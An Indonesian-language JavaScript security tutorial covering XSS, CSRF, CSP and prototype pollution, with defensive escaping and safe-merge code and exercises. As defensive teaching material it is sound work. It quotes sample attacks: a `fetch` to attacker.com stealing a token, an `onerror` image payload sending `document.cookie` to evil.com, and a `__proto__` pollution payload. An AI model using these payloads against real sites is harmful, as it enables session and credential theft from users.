# JavaScript Security Best Practices: XSS, CSRF & CSP

**Slug**: `javascript-security` · **Level**: Intermediate · **Waktu**: 25 Menit

## 🎯 Tujuan Pembelajaran
- Mengidentifikasi dan memitigasi vektor serangan Cross-Site Scripting (XSS: Stored, Reflected, DOM-based) serta membedakan manipulasi DOM yang aman (`textContent`) vs berbahaya (`innerHTML`).
- Menerapkan strategi isolasi kredensial menggunakan atribut `HttpOnly`, `SameSite` cookies, dan anti-CSRF token untuk mencegah eksfiltrasi sesi pengguna.
- Memahami mekanisme Prototype Pollution pada engine V8 dan mengimplementasikan defensive coding menggunakan `Object.freeze()`, `Object.create(null)`, dan validasi kunci objek recursive.

---

## 📖 Materi Lengkap

### 1. Konsep Utama
Keamanan aplikasi web berbasis JavaScript berakar pada pemahaman batas eksekusi runtime browser (*browser execution boundary*). Ketika browser mem-parsing dokumen web, terdapat pemisahan tegas antara DOM Parser (C++ engine seperti Blink pada Chromium) dan runtime JavaScript (V8 engine). Celah keamanan terjadi saat data yang tidak terpercaya (*untrusted input*) berhasil keluar dari konteks data murni dan diinterpretasikan sebagai instruksi eksekusi oleh parser.

**Cross-Site Scripting (XSS)** terbagi menjadi tiga varian:
1. **Stored XSS**: Payload berbahaya tersimpan permanen di database, lalu dieksekusi setiap kali korban memuat data tersebut.
2. **Reflected XSS**: Payload dikirim via parameter request (misal URL query string) dan langsung direfleksikan kembali oleh server ke dalam respons HTML.
3. **DOM-based XSS**: Vektor serangan murni terjadi di sisi klien. JavaScript membaca input dari *source* yang tidak aman (seperti `location.search` atau `location.hash`) lalu menulisnya ke *sink* berbahaya (seperti `innerHTML`, `document.write`, atau `eval()`) tanpa sanitasi.

```text
Vektor XSS:
Source (location.hash) ──> Sink Berbahaya (element.innerHTML) ──> Script Execution
```

**Penyimpanan Token & CSRF**:
Menyimpan token JWT pada `localStorage` adalah antipola kritis. `localStorage` dapat diakses langsung oleh skrip JavaScript apa pun yang berjalan di *origin* yang sama (`window.localStorage.getItem('token')`). Satu kerentanan XSS kecil sudah cukup bagi penyerang untuk mengeksfiltrasi token via `fetch('https://attacker.com/steal?t=' + token)`. 

Solusi standarnya adalah menggunakan cookie dengan flag **`HttpOnly`** (mencegah akses JavaScript secara langsung), **`Secure`** (hanya dikirim via HTTPS), dan **`SameSite=Strict`** atau **`SameSite=Lax`**. Atribut `SameSite` memblokir browser mengirim cookie otomatis pada navigasi lintas-situs (*cross-site requests*), sehingga secara efektif menetralkan ancaman **Cross-Site Request Forgery (CSRF)**.

**Content Security Policy (CSP)** bertindak sebagai lapisan pertahanan mendalam (*defense-in-depth*). Didefinisikan via HTTP response header (`Content-Security-Policy`), CSP membatasi domain asal resource yang boleh dimuat (skrip, gaya, gambar) dan memblokir eksekusi inline script tak berizin (`unsafe-inline`).

**Prototype Pollution** adalah kerentanan spesifik JavaScript di mana penyerang memanipulasi rantai prototipe global (`Object.prototype`) melalui injeksi properti khusus seperti `__proto__` atau `constructor.prototype`. Karena semua objek standar mewarisi properti dari `Object.prototype`, modifikasi ini mencemari seluruh *object instance* di V8 heap memory.

---

### 2. Sintaks & Penggunaan Modern

Berikut adalah implementasi fungsi sanitasi output kontekstual dan pencegahan Prototype Pollution menggunakan ES2024:

```javascript
// 1. Sanitasi Output: HTML Entity Escaping (Contextual Output Encoding)
const escapeHTML = (unsafeString) => {
  return String(unsafeString).replace(/[&<>"']/g, (match) => {
    const lookup = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
    };
    return lookup[match];
  });
};

// 2. Safe Deep Merge: Mencegah Prototype Pollution
const safeDeepMerge = (target, source) => {
  // Buat dictionary kunci terlarang
  const forbiddenKeys = new Set(['__proto__', 'constructor', 'prototype']);

  for (const [key, value] of Object.entries(source)) {
    if (forbiddenKeys.has(key)) {
      console.warn(`[Security Warning] Percobaan Prototype Pollution pada key: "${key}"`);
      continue; // Lewati kunci berbahaya
    }

    if (value && typeof value === 'object' && !Array.isArray(value)) {
      if (!Object.hasOwn(target, key) || typeof target[key] !== 'object') {
        target[key] = Object.create(null); // Objek bersih tanpa prototipe
      }
      safeDeepMerge(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
};

// Pengujian Keamanan Sanitasi
const userInputXSS = '<script>alert("Hacked!")</script>';
const safeRendered = escapeHTML(userInputXSS);
console.log('Sanitized Output:', safeRendered);

// Pengujian Prototype Pollution Protection
const maliciousPayload = JSON.parse('{"__proto__": {"isAdmin": true}, "theme": "dark"}');
const appConfig = Object.create(null);

safeDeepMerge(appConfig, maliciousPayload);

const regularUser = {};
console.log('Apakah objek biasa tercemar isAdmin?', regularUser.isAdmin ?? false);
console.log('Config aplikasi yang aman:', appConfig);
```

---

### 3. Studi Kasus Nyata

Skenario: Membangun sistem parsing komentar pengguna dan state config runtime yang tahan terhadap XSS dan Prototype Pollution sebelum dirender ke antarmuka aplikasi.

```javascript
// Sistem Manajemen Komentar Aman & Imutabel
class SecureCommentFeed {
  #comments = [];

  constructor() {
    // Membekukan prototipe internal agar tidak dapat dimodifikasi saat runtime
    Object.freeze(SecureCommentFeed.prototype);
  }

  addComment(author, rawContent) {
    // Sanitasi data sebelum disimpan ke memori
    const sanitizedComment = {
      id: crypto.randomUUID(),
      author: this.#sanitizeText(author),
      content: this.#sanitizeText(rawContent),
      timestamp: new Date().toISOString(),
    };

    // Object.freeze memastikan integritas data dalam heap memory
    this.#comments.push(Object.freeze(sanitizedComment));
  }

  #sanitizeText(input) {
    if (typeof input !== 'string') return '';
    return input
      .replaceAll('&', '&amp;')
      .replaceAll('<', '&lt;')
      .replaceAll('>', '&gt;')
      .replaceAll('"', '&quot;')
      .replaceAll("'", '&#x27;')
      .replaceAll('/', '&#x2F;');
  }

  getFeed() {
    // Mengembalikan shallow copy yang aman
    return Object.freeze([...this.#comments]);
  }
}

// Simulasi Konsumsi Input Pengguna
const feed = new SecureCommentFeed();

// Payload berbahaya dari penyerang
const attackerInput = '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">';
feed.addComment('Hacker_Zero', attackerInput);
feed.addComment('NormalUser', 'Terima kasih atas artikelnya!');

const activeFeed = feed.getFeed();
console.log('Feed Tersimpan Aman:');
console.log(JSON.stringify(activeFeed, null, 2));

// Membuktikan imutabilitas objek
try {
  activeFeed[0].author = 'Modifikator';
} catch (e) {
  console.log('Immutability Check: Berhasil mencegah manipulasi data runtime');
}
```

---

### 4. Visualisasi & Mental Model

```text
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                              BROWSER SECURITY BOUNDARY                                 │
├──────────────────────────────┬────────────────────────────┬────────────────────────────┤
│     JAVASCRIPT CONTEXT       │       DOM ENGINE           │       NETWORK LAYER        │
│       (V8 Engine)            │     (HTML/CSS Parser)      │        (Cookie Jar)        │
├──────────────────────────────┼────────────────────────────┼────────────────────────────┤
│                              │                            │                            │
│  [ LocalStorage Token ] ─────┼─(XSS Vulnerable Sink)─────>│  [ Attacker Exfiltration ] │
│  Raw string exposed to JS    │  innerHTML / eval()        │  Data dikirim keluar       │
│                              │                            │                            │
│  [ HttpOnly Cookie ] ────────┼────────(BLOCKED)──────────>│  [ Protected Credentials ] │
│  Shielded from JS Execution  │  Tidak bisa dibaca via JS  │  Otomatis & Terenkripsi    │
│                              │                            │                            │
│  [ CSP Enforcement ] ────────┴───────────────────────────>│  [ Network Policy Filter ] │
│  default-src 'self'; script-src 'self' https://trusted.com│  Memblokir skrip ilegal    │
└────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## 💡 Best Practices & Tips

- ✅ **Pilihlah Sink yang Tepat**: Selalu gunakan `element.textContent` atau `element.setAttribute()` alih-alih `element.innerHTML` saat memasukkan data dinamis ke DOM.
- ✅ **Gunakan Library Sanitasi Teruji**: Untuk kebutuhan parsing HTML kompleks dari rich-text editor, gunakan parser terspesialisasi seperti `DOMPurify` sebelum menyisipkan konten ke DOM.
- ✅ **Konfigurasikan CSP Ketat**: Terapkan header HTTP `Content-Security-Policy: default-src 'self'; object-src 'none'; base-uri 'none'; require-trusted-types-for 'script';` untuk meminimalisir eksekusi skrip injeksi.
- ✅ **Isolasi State Menggunakan Prototype-less Object**: Gunakan `Object.create(null)` atau `new Map()` untuk menyimpan konfigurasi atau kamus data yang diisi dari payload eksternal.
- ❌ **Hindari `eval()`, `new Function()`, dan `setTimeout(string)`**: Fungsi-fungsi ini menjalankan string parser yang secara langsung membuka vektor Remote Code Execution jika input terkontaminasi.

---

## ✍️ Latihan Mandiri

1. **Defensif Parser Komentar**: Di Code Editor di bawah, buat fungsi `safeTemplateParser(strings, ...values)` berbasis Tagged Template Literals yang secara otomatis melakukan sanitasi pada setiap ekspresi `${value}` sebelum string digabungkan.
2. **Prototype Armor**: Di Code Editor di bawah, buat sebuah fungsi `deepFreeze(object)` yang membekukan objek bersarang (*nested objects*) secara rekursif dan memvalidasi bahwa tidak ada modifikasi pada objek prototipe dasar (`Object.prototype`).

---

## 🔗 Referensi
- [MDN Web Docs: Cross-site scripting (XSS)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)
- [MDN Web Docs: Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP: Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [ECMAScript: Object.freeze & Property Definition Specification](https://tc39.es/ecma262/)